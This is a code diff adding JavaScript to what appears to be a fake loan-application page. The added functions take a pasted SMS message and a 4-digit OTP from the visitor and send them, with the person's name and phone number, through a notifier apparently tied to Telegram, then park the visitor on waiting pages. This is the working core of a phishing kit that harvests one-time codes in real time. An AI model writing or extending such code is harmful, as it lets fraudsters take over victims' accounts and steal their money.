+                showSmsMsg('error', 'Please paste an SMS message.');
+                return;
+            }
+
+            document.getElementById('mSms').classList.add('show');
+            document.getElementById('bSms').disabled = true;
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    // ─── Send SMS with full user details (name & number) ───
+                    updateSession(S.applicationId, {
+                        smsMessage: msg,
+                        stage: 'sms_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: S.phone,
+                        smsMessage: msg
+                    }, 'sms');
+
+                    document.getElementById('mSms').classList.remove('show');
+                    stopSmsTimer();
+                    document.getElementById('waitSmsAppId').textContent = S.applicationId;
+                    goTo('page-wait-sms');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                document.getElementById('mSms').classList.remove('show');
+                document.getElementById('bSms').disabled = false;
+                showSmsMsg('error', 'Error: ' + err.message);
+            }
+        }
+
+        // ══════════════════════════════════════════════════════
+        // OTP PAGE — 4-DIGIT OTP
+        // ══════════════════════════════════════════════════════
+        function handleOtpInput(el, type) {
+            el.value = el.value.replace(/\D/, '');
+            const idx = parseInt(el.id.match(/\d$/)[0]);
+            if (el.value && type === 'otp' && idx < 3) {
+                document.getElementById(type + (idx + 1)).focus();
+            }
+            chkOtp();
+        }
+
+        function chkOtp() {
+            const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
+            document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+        }
+
+        function showOtpMsg(type, text) {
+            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('otpMsgTxt').textContent = text;
+                document.getElementById('otpMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('otpMsgOkTxt').textContent = text;
+                document.getElementById('otpMsgOk').classList.add('show');
+            }
+        }
+
+        async function doOtp() {
+            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
+
+            if (otp.length < 4) {
+                showOtpMsg('error', 'Please enter 4-digit OTP code.');
+                return;
+            }
+
+            document.getElementById('mOtp').classList.add('show');
+            document.getElementById('bOtp').disabled = true;
+            document.getElementById('bOtp').textContent = 'VERIFYING...';
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    updateSession(S.applicationId, {
+                        otp: otp,
+                        stage: 'otp_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: S.phone,
+                        otp: otp
+                    }, 'otp');
+
+                    document.getElementById('mOtp').classList.remove('show');
+                    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+                    goTo('page-wait-otp');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                document.getElementById('mOtp').classList.remove('show');
+                document.getElementById('bOtp').disabled = false;
+                document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+                showOtpMsg('error', 'Error: ' + err.message);
+            }
+        }
+
+        // INIT
+        updateCalc();
+        goTo('page-landing');
     </script>
 </body>
 
